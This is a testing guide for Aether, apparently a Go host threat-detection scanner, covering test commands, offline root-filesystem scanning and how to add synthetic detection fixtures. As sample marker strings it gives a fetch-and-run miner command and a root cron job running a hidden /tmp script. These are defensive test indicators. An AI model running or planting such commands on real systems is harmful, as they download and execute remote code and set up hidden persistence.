# Testing Guide for Aether

Aether uses a combination of unit tests, race detector validation, and a table-driven golden fixture suite to guarantee threat detection accuracy and forensic safety.

---

## 1. Running Tests

```bash
# Run all unit tests (pure Go)
make test

# Run tests with race detection
go test -race -count=1 ./...

# Run golden fixture offline test suite
make test-fixtures

# Run YARA-X extended tests (when libyara_x_capi is installed)
make test-yara
```

---

## 2. Offline Mode & Fixture Architecture

Aether supports scanning offline root filesystem directory trees using `--root <dir>`. In this mode:
- All paths are resolved relative to the specified root directory (`rootFS`).
- Symlinks that escape the root boundary are refused (resolved strictly within the root tree, as a chroot would).
- Host file inspections (`filesystem`, `persistence`, `users`, `kernel` modprobe rules, `pkgdb`) audit the offline tree.
- Live-only modules (`process`, `network`, live kernel modules, hidden-PID sweeps) are cleanly marked `NOT APPLICABLE (offline mode)` without emitting errors or false findings.
- The scan never writes to or alters files under `--root`.

---

## 3. How to Add a Fixture for a New Detection

All test fixtures reside under `testdata/fixtures/<fixture_name>/`.

### Rules for Synthetic Fixtures
1. **Harmless Content Only**: Never check in real malware, exploit binaries, or proprietary secrets. Use benign marker strings (e.g. `curl http://example.com/miner.sh | bash`, `/tmp/.hidden_miner`).
2. **Minimal Tree Structure**: Create only the directories and files necessary for the test case (e.g. `etc/passwd`, `etc/shadow`, `etc/cron.d/`, `etc/systemd/system/`).

### Step-by-Step Instructions

1. **Create the fixture folder**:
   ```bash
   mkdir -p testdata/fixtures/my_new_detection/etc/cron.d
   ```

2. **Add standard minimal baseline files**:
   Populate minimal `etc/passwd`, `etc/shadow`, `etc/group`, and `etc/sudoers` (you can copy from `testdata/fixtures/clean_debian/etc/`).

3. **Add the indicator file**:
   For example, create an anomalous persistence hook or script:
   ```bash
   cat << 'EOF' > testdata/fixtures/my_new_detection/etc/cron.d/anomalous_job
   * * * * * root /tmp/.unusual_script.sh
   EOF
   ```

4. **Register the test case in `internal/scanner/fixtures_test.go`**:
   Add an entry to the `tests` slice:
   ```go
   {
       name:            "my_new_detection",
       fixtureDir:      filepath.Join(fixturesRoot, "my_new_detection"),
       expectedVerdict: events.VerdictSuspicious,
       expectedRules:   []string{"Persistence_Cron_Suspicious_Command"},
       minSeverity:     report.SeverityWarning,
       mustBeClean:     false,
   },
   ```

5. **Run the test suite**:
   ```bash
   make test-fixtures
   ```
